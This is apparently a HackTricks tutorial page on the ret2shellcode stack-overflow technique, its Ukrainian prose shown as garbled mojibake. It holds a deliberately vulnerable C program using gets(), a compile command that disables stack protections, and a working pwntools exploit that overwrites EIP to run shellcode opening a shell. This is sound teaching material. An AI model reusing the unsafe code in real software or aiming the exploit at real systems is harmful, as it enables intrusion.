# Ret2Shellcode

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## –ë–∞–∑–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

**Ret2shellcode** - —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –±—ñ–Ω–∞—Ä–Ω–æ–º—É –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó, –¥–µ –∞—Ç–∞–∫—É—é—á–∏–π –∑–∞–ø–∏—Å—É—î shellcode –≤ —Å—Ç–µ–∫ –≤—Ä–∞–∑–ª–∏–≤–æ—ó –ø—Ä–æ–≥—Ä–∞–º–∏, –∞ –ø–æ—Ç—ñ–º –º–æ–¥–∏—Ñ—ñ–∫—É—î **–í–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó (IP)** –∞–±–æ **–†–æ–∑—à–∏—Ä–µ–Ω–∏–π –í–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó (EIP)**, —â–æ–± –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –º—ñ—Å—Ü–µ —Ü—å–æ–≥–æ shellcode, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –π–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è. –¶–µ –∫–ª–∞—Å–∏—á–Ω–∏–π –º–µ—Ç–æ–¥, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –Ω–µ–∑–∞–∫–æ–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É –∞–±–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥ –Ω–∞ —Ü—ñ–ª—å–æ–≤—ñ–π —Å–∏—Å—Ç–µ–º—ñ. –û—Å—å —Ä–æ–∑–±—ñ—Ä –ø—Ä–æ—Ü–µ—Å—É, –≤–∫–ª—é—á–∞—é—á–∏ –ø—Ä–æ—Å—Ç–∏–π –ø—Ä–∏–∫–ª–∞–¥ –Ω–∞ –º–æ–≤—ñ C —Ç–∞ —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –µ–∫—Å–ø–ª–æ–π—Ç, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Python –∑ **pwntools**.

### –ü—Ä–∏–∫–ª–∞–¥ –Ω–∞ –º–æ–≤—ñ C: –í—Ä–∞–∑–ª–∏–≤–∞ –ø—Ä–æ–≥—Ä–∞–º–∞

–î–∞–≤–∞–π—Ç–µ —Ä–æ–∑–ø–æ—á–Ω–µ–º–æ –∑ –ø—Ä–æ—Å—Ç–æ–≥–æ –ø—Ä–∏–∫–ª–∞–¥—É –≤—Ä–∞–∑–ª–∏–≤–æ—ó –ø—Ä–æ–≥—Ä–∞–º–∏ –Ω–∞ –º–æ–≤—ñ C:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
–¶—è –ø—Ä–æ–≥—Ä–∞–º–∞ –º–∞—î —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –Ω–∞ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ —á–µ—Ä–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó `gets()`.

### –ö–æ–º–ø—ñ–ª—è—Ü—ñ—è

–î–ª—è –∫–æ–º–ø—ñ–ª—è—Ü—ñ—ó —Ü—ñ—î—ó –ø—Ä–æ–≥—Ä–∞–º–∏ –∑ –≤–∏–º–∫–Ω–µ–Ω–Ω—è–º —Ä—ñ–∑–Ω–∏—Ö –∑–∞—Ö–∏—Å—Ç—ñ–≤ (–¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞), –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: –í–∏–º–∏–∫–∞—î –∑–∞—Ö–∏—Å—Ç —Å—Ç–µ–∫—É.
* `-z execstack`: –†–æ–±–∏—Ç—å —Å—Ç–µ–∫ –≤–∏–∫–æ–Ω–∞–≤—á–∏–º, —â–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è shellcode, –∑–±–µ—Ä–µ–∂–µ–Ω–æ–≥–æ –≤ —Å—Ç–µ—Ü—ñ.
* `-no-pie`: –í–∏–º–∏–∫–∞—î –ø–æ–∑–∏—Ü—ñ–π–Ω–æ-–Ω–µ–∑–∞–ª–µ–∂–Ω–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª, —â–æ –ø–æ–ª–µ–≥—à—É—î –ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ –ø–∞–º'—è—Ç—ñ, –¥–µ –±—É–¥–µ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –Ω–∞—à shellcode.
* `-m32`: –ö–æ–º–ø—ñ–ª—é—î –ø—Ä–æ–≥—Ä–∞–º—É —è–∫ 32-–±—ñ—Ç–Ω–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª, —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Å–ø—Ä–æ—â–µ–Ω–Ω—è —Ä–æ–∑—Ä–æ–±–∫–∏ –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤.

### –ï–∫—Å–ø–ª–æ–π—Ç –Ω–∞ Python –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º Pwntools

–û—Å—å —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç –Ω–∞ Python, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **pwntools**, –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ **ret2shellcode**:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
–¶–µ–π —Å–∫—Ä–∏–ø—Ç —Å—Ç–≤–æ—Ä—é—î –ø–æ–ª–µ–∑–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —â–æ —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ **NOP —Å–ª–∞–π–¥—É**, **shellcode**, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î **EIP** –∞–¥—Ä–µ—Å–æ—é, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ NOP —Å–ª–∞–π–¥, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è shellcode.

**NOP slide** (`asm('nop')`) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–±—ñ–ª—å—à–µ–Ω–Ω—è –π–º–æ–≤—ñ—Ä–Ω–æ—Å—Ç—ñ —Ç–æ–≥–æ, —â–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è "—Å–ª–∞–π–¥—É–≤–∞—Ç–∏–º–µ" —É –Ω–∞—à shellcode –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ—á–Ω–æ—ó –∞–¥—Ä–µ—Å–∏. –ù–∞–ª–∞—à—Ç—É–π—Ç–µ –∞—Ä–≥—É–º–µ–Ω—Ç `p32()` –Ω–∞ –ø–æ—á–∞—Ç–∫–æ–≤—É –∞–¥—Ä–µ—Å—É –≤–∞—à–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –ø–ª—é—Å –∑–º—ñ—â–µ–Ω–Ω—è, —â–æ–± –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –Ω–∞ NOP —Å–ª–∞–π–¥.

## –ó–∞—Ö–∏—Å—Ç–∏

* [**ASLR**](../common-binary-protections/aslr.md) **–ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –≤–∏–º–∫–Ω–µ–Ω–∏–π** –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –∞–¥—Ä–µ—Å–∞ –±—É–ª–∞ –Ω–∞–¥—ñ–π–Ω–æ—é –ø—ñ–¥ —á–∞—Å –∫–æ–∂–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, –∞–±–æ –∞–¥—Ä–µ—Å–∞, –¥–µ –±—É–¥–µ –∑–±–µ—Ä–µ–∂–µ–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è, –Ω–µ –±—É–¥–µ –∑–∞–≤–∂–¥–∏ –æ–¥–Ω–∞–∫–æ–≤–æ—é, —ñ –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è —è–∫–∏–π—Å—å –≤–∏—Ç—ñ–∫, —â–æ–± –∑'—è—Å—É–≤–∞—Ç–∏, –¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –ø–µ—Ä–µ–º–æ–≥–∏.
* [**Stack Canaries**](../common-binary-protections/stack-canaries.md) —Ç–∞–∫–æ–∂ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –≤–∏–º–∫–Ω–µ–Ω—ñ, —ñ–Ω–∞–∫—à–µ –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∞ –∞–¥—Ä–µ—Å–∞ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è EIP –Ω—ñ–∫–æ–ª–∏ –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∞.
* [**NX**](../common-binary-protections/no-exec-nx.md) –∑–∞—Ö–∏—Å—Ç **—Å—Ç–µ–∫—É** –ø–µ—Ä–µ—à–∫–æ–¥–∂–∞—Ç–∏–º–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—é shellcode –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–µ–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü—è –æ–±–ª–∞—Å—Ç—å –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ—é.

## –Ü–Ω—à—ñ –ü—Ä–∏–∫–ª–∞–¥–∏

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ –≥—Ä—É–ø–∏ [**telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
